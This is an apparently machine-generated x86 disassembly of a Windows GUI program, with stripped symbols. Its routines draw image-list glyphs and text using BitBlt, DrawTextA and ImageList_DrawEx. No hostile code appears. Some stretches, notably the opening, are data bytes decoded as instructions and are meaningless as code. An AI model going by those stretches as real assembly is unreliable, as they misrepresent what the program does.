inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
outsb
jae r-xdata
sbb [ esi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3865646f
retn 0x44
inc edx
add [ eax + 0x4c000000 ] cl
xchg ebp eax
inc ebx
add [ ecx + 0x34ac0041 ] bl
inc eax
add al dh
0x34b40041 0x40
test al 0x34
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ esp + eax * 8 ] ch
inc edx
add [ eax - 0x55 ] ah
inc esp
add al ch
scasb [ edi ]
inc esp
add [ eax + 0x7c0044aa ] ah
sahf
inc ecx
add [ eax - 0x63 ] cl
inc ecx
add [ esi + ebx * 4 - 0x607bffbf ] cl
inc ecx
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ esp + ebx * 4 - 0x596bffbc ] dl
inc esp
add [ eax + edx * 2 - 0x4c63ffbc ] bl
inc esp
add [ eax ] ch
mov ah 0x44
add al ah
push ecx
inc esp
add [ edx ] cl
push esp
inc edi
insb
jns r-xdata
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
popad
jb r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
inc eax
add [ eax - 0x3b ] cl
inc edx
add [ ebx ] cl
push esp
inc edi
insb
jns r-xdata
push 0x7473694c
nop
add al 0xc3
inc edx
add [ edi ] al
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
mov esp 0xd800437e
add [ eax ] al
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
insb
inc ebx
insb
je r-xdata
outsb
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
adc [ eax ] al
push edi
add [ eax ] al
inc [ eax - 0x32 ]
inc ebx
add [ edi + ebp * 8 + 0x43 ] bl
add [ eax + 0x1 ] al
and [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0xac656c62
adc eax 0x1200041
add bh bh
and [ ecx ] al
add bh bh
mov esp 0x43ef
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
pop ds
add [ edi ] al
push ebx
jo r-xdata
push eax
fld [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
add bh bh
jno r-xdata
push 0x68636143
enter 0x42c3 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x7473694c
mov al 0xc2
inc edx
add al ch
xchg ebp eax
inc ebx
add [ eax + eax ] cl
pop es
inc edx
jne r-xdata
xchg ebx eax
dec [ ebx - 0x740f7426 ]
inc ebp
or [ eax + 0x33 ] dl
ror [ ebx - 0x2719173a ] cl
add [ eax ] eax
dec [ ebx - 0x31d7f2d ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x42c3 0x0
xor [ eax ] al
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ esi + eax * 8 + 0x540c0042 ] bl
inc edx
jne r-xdata
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
push ss
outsb
std
outsb
inc edi
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
retn
outsb
jae r-xdata
mov eax esi
call sub_449d34
test bl bl
jle r-xdata
and dl 0xfc
push 0x5500408d
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
add [ eax - 0x3d ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3d ] dh
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x5fffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_449ce0
add esp 0xfffffff0
call sub_40357c
sub_42c268
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xc3
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
retn 0x42
sub_42c3d8
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_449ce0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_42c42c
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_449d34
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_42c45c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_41445c
mov esi eax
mov eax [ ebx + 0x80 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_414418
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_44a168
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_414374
sub_42c4a8
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42c45c
mov esi eax
push ebp
mov ecx edi
mov edx esi
mov eax ebx
call sub_44a374
inc [ ebx + 0x84 ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42c4d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_414444
test al al
je r-xdata
pop esi
pop ebx
retn
dec [ ebx + 0x84 ]
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_414418
sub_42c504
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_42c548
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_42c578
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ esp ]
push eax
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c3d8
mov ebx eax
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413de8
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413f44
mov ebx eax
cmp ebp [ ebx + 0x34 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ esp ]
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42c5d8
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ eax + 0x4 ]
call sub_414088
mov eax ebx
call sub_403258
sub_42c608
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403228
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov esi eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_42c73c
mov [ ebx + 0x1c ] 0x8080
mov [ ebx + 0x20 ] 0x1
xor eax eax
add esp 0xfffffff0
call sub_40357c
xor edx edx
mov dl al
mov [ ebx + edx * 4 + 0xc ] 0xffffffff
inc eax
cmp al 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c504
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_42c69c
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403258
mov eax esi
call sub_42c6f8
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
mov eax [ rw-data ]
call sub_42c5fc
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
mov eax [ rw-data ]
call sub_403258
xor eax eax
mov [ rw-data ] eax
sub_42c6f8
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov [ esi + edi * 4 + 0xc ] 0xffffffff
inc ebx
cmp bl 0x4
jne r-xdata
mov edx eax
mov eax [ esi + 0x8 ]
call sub_42c4d4
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_42c5d8
xor eax eax
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
sub_42c73c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp edx esi
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_422560
mov [ ebx + 0x1c ] eax
mov eax ebx
call sub_42c6f8
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_42c76c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_42c6f8
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_422560
mov [ esi + 0x1c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
cmp eax 0x4
jle r-xdata
mov edx eax
mov eax esi
call sub_42c7e4
mov eax 0x1
sub_42c7e4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jbe r-xdata
mov eax esi
call sub_42c6f8
mov [ esi + 0x20 ] bl
mov edx [ esi + 0x4 ]
mov eax esi
call sub_42c73c
sub_42c80c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + eax * 4 + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x3
jae r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
or esi eax
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov esi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42cdbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push esi
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
xor edx edx
xor eax eax
call sub_412b10
mov eax [ ebp - 0xc ]
call sub_422474
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d5e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
call sub_421c3c
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov bl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x20 ]
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
mov cl bl
inc ecx
imul ecx edi
xor eax eax
mov al bl
imul edi
xor edx edx
call sub_412b10
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
xor ebx ebx
mov ecx esi
mov edx edi
mov eax [ rw-data ]
call sub_42c578
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c504
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_422474
push eax
mov eax [ ebp - 0xc ]
call sub_422474
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d854
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x38 ] 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx 0x20000000
mov edx [ ebp - 0xc ]
call sub_42c4a8
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_42c4a8
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42cd7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
jbe r-xdata
dec eax
sub al 0x2
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403258
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x14 ]
call sub_422474
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41d5e4
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
call sub_422530
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_422474
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422474
mov ecx eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41d854
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_423244
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_422474
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41d5e4
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422474
push eax
mov eax [ ebp - 0x14 ]
call sub_422474
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d854
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000014
call sub_41d5e4
mov eax [ ebp - 0x18 ]
call sub_41dd2c
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422474
call sub_41dd2c
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x10 ]
call sub_422474
mov eax [ eax + 0x14 ]
mov edx 0x808080
call sub_41d5e4
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422474
push eax
mov eax [ ebp - 0x14 ]
call sub_422474
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d854
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_41d5e4
mov eax [ ebp - 0x18 ]
call sub_41dd2c
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422474
call sub_41dd2c
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_41c958
push eax
mov eax [ ebp - 0x10 ]
call sub_422474
mov eax [ eax + 0x14 ]
pop edx
call sub_41d5e4
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422474
push eax
mov eax [ ebp - 0x14 ]
call sub_422474
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d854
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d5e4
mov eax [ ebp - 0x18 ]
call sub_41dd2c
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422474
call sub_41dd2c
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_423244
mov eax [ ebp - 0xc ]
call sub_422474
mov ebx eax
mov eax [ ebx + 0x14 ]
mov edx 0xff00000f
call sub_41d5e4
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_41d988
mov eax [ ebx + 0x14 ]
mov edx 0xff000014
call sub_41d5e4
push 0x0
mov eax ebx
call sub_41dd2c
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41dd2c
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422474
call sub_41dd2c
push eax
push esi
push edi
push 0x1
push 0x1
mov eax ebx
call sub_41dd2c
push eax
call BitBlt
mov eax [ ebx + 0x14 ]
mov edx 0xff000010
call sub_41d5e4
push 0x0
mov eax ebx
call sub_41dd2c
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41dd2c
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422474
call sub_41dd2c
push eax
push esi
push edi
push 0x0
push 0x0
mov eax ebx
call sub_41dd2c
push eax
call BitBlt
mov eax [ ebp - 0x14 ]
call sub_422474
mov eax [ eax + 0xc ]
mov edx 0xffffff
call sub_41ce18
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_423244
mov eax [ ebp - 0x14 ]
call sub_422474
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41d5e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403258
mov eax [ ebp - 0x14 ]
call sub_403258
retn
sub_42cde4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0xc ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
je r-xdata
mov edx ebx
mov eax edi
call sub_42c80c
mov esi eax
call sub_42f548
call sub_42f628
test al al
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
xor edx edx
mov dl [ edi + 0x20 ]
mov ecx edx
cdq
idiv ecx
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
dec bl
je r-xdata
push 0x1
push 0x1fffffff
push 0x1fffffff
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41dd2c
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_44a02c
push eax
call ImageList_DrawEx
jmp r-xdata
cmp bl 0x3
jne r-xdata
mov bl 0x5
jmp r-xdata
dec ebx
sub bl 0x2
jb r-xdata
push 0x0
push 0x1fffffff
mov eax 0xff00000f
call sub_41c958
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41dd2c
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_44a02c
push eax
call ImageList_DrawEx
call sub_42f548
lea ecx [ ebp - 0x14 ]
mov edx ebx
call sub_42f88c
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi + 0x8 ]
call sub_44a02c
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_41dd2c
push eax
call sub_42f548
lea ecx [ ebp - 0x14 ]
pop edx
call sub_42f778
jmp r-xdata
mov bl 0x4
jmp r-xdata
jmp r-xdata
mov bl 0x2
sub_42cf48
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_41d700
cmp [ ebp + 0xc ] 0x1
jne r-xdata
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404268
push eax
mov eax esi
call sub_404468
push eax
mov eax ebx
call sub_41dd2c
push eax
call DrawTextA
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000014
mov eax [ ebx + 0xc ]
call sub_41ce18
mov eax edi
or eax 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404268
push eax
mov eax esi
call sub_404468
push eax
mov eax ebx
call sub_41dd2c
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ ebx + 0xc ]
call sub_41ce18
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404268
push eax
mov eax esi
call sub_404468
push eax
mov eax ebx
call sub_41dd2c
push eax
call DrawTextA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_42d028
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
lea ecx [ ebp - 0x18 ]
call sub_412ae8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412ae8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
lea ecx [ ebp - 0x20 ]
pop edx
call sub_412ae8
jmp r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov [ ebp + 0x1c ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x40 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412b10
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_412ae8
push 0x0
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
xor edx edx
xor eax eax
call sub_412b10
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
or eax 0x400
push eax
push edi
mov eax [ ebp + 0x20 ]
call sub_404268
push eax
mov eax [ ebp + 0x20 ]
call sub_404468
push eax
mov eax [ ebp - 0x8 ]
call sub_41dd2c
push eax
call DrawTextA
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
